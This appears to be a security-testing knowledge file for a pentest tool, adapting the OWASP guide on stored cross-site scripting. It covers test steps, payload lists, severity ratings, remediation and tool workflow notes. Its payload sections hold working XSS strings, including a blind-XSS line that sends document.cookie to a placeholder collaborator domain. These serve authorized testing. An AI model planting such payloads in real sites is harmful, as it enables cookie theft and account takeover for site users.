---
id: WSTG-INPV-02
title: Testing for Stored Cross-Site Scripting
category: Input Validation
severity_range: High-Critical
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting
---

# WSTG-INPV-02: Testing for Stored Cross-Site Scripting

## Summary

Stored (persistent) XSS occurs when user input is saved by the application (in a database, file system, etc.) and later rendered to other users without proper encoding. This is more dangerous than reflected XSS because the payload persists and can affect many users.

## Test Objectives

- Identify input fields whose values are stored and displayed to users
- Test if stored values are rendered without proper output encoding
- Determine the impact and reach of stored XSS vulnerabilities

## Prerequisites

- Target application has features that store and display user content (comments, profiles, messages, etc.)
- A test account to submit content
- Docker pentest container capturing traffic

## Test Steps

### Step 1: Identify Stored Input Vectors

**CLI Actions:**
1. Use `curl` to identify requests that submit user content:
   - Profile fields (name, bio, address)
   - Comments / reviews
   - Forum posts / messages
   - File names during upload
   - Settings / preferences
2. Use `curl` with pattern `POST.*(comment|profile|message|post|review|feedback)` to find submission endpoints

### Step 2: Inject Canary Values

**CLI Actions:**
1. For each stored input field, use `curl` to submit a unique canary:
   ``
   POST /api/profile HTTP/1.1
   Content-Type: application/json

   {"bio": "CANARY_STORED_XSS_12345"}
   ``
2. Navigate to the page where the content is displayed
3. Use `curl` to fetch the display page and check if the canary appears

### Step 3: Test XSS Payloads

**CLI Actions:**
For each confirmed stored reflection, use `curl` to submit XSS payloads:

1. Submit the payload via the storage endpoint
2. Fetch the page that displays the stored content
3. Check if the payload appears unencoded

### Step 4: Test Different Output Contexts

The stored value may be rendered in multiple places (e.g., profile page, admin view, email notification, PDF export). Test each output context:

**CLI Actions:**
1. After submitting a payload, use `curl` to check all locations where the data appears
2. Check API responses (JSON) - stored XSS can affect SPAs parsing JSON
3. Check admin panels where user content is moderated

### Step 5: Check Payload Persistence

**CLI Actions:**
1. After submitting a payload, log out and log back in
2. Check if the payload persists across sessions
3. Check if other users can see the payload (use a second test account)

## Payloads

### Basic Stored XSS Payloads
```
<script>alert('StoredXSS')</script>
<img src=x onerror=alert('StoredXSS')>
<svg onload=alert('StoredXSS')>
"><img src=x onerror=alert('StoredXSS')>
```

### Payloads for Specific Fields

#### Display Name / Username
```
<img src=x onerror=alert('XSS')>
test"><script>alert('XSS')</script>
```

#### Bio / Description (Markdown/Rich Text)
```
[Click me](javascript:alert('XSS'))
![alt](x" onerror="alert('XSS'))
<details open ontoggle=alert('XSS')>test</details>
```

#### File Upload Names
```
"><img src=x onerror=alert('XSS')>.jpg
test<svg onload=alert('XSS')>.png
```

### Polyglot XSS Payloads
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teleType/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Blind XSS Payloads (for admin panels)
```
"><script src=https://your-collaborator-domain/xss.js></script>
<img src=x onerror="fetch('https://your-collaborator-domain/steal?c='+document.cookie)">
```

## Detection Criteria

A finding should be logged when:
- User-submitted content is displayed without HTML encoding
- XSS payloads render executable HTML/JavaScript when viewing stored content
- Stored content affects other users who view the page
- Payloads persist across sessions and page loads

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Stored XSS on a page visible to many users (e.g., public comments) | Critical |
| Stored XSS in admin panel (blind XSS) | Critical |
| Stored XSS on authenticated user's own profile viewed by others | High |
| Stored XSS in private messages (affects single recipient) | High |
| Stored XSS in file names or metadata | Medium |
| Stored XSS blocked by CSP | Low |

## Remediation

- Apply context-aware output encoding when rendering all user-generated content
- Sanitize HTML input using a well-tested library (e.g., DOMPurify, Bleach)
- Implement Content-Security-Policy with nonces
- Set HttpOnly flag on session cookies
- Use modern frameworks with auto-escaping enabled
- Validate and sanitize input on submission (defense in depth)
- Consider rendering user content in sandboxed iframes

## References

- [OWASP Testing Guide - Stored XSS](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

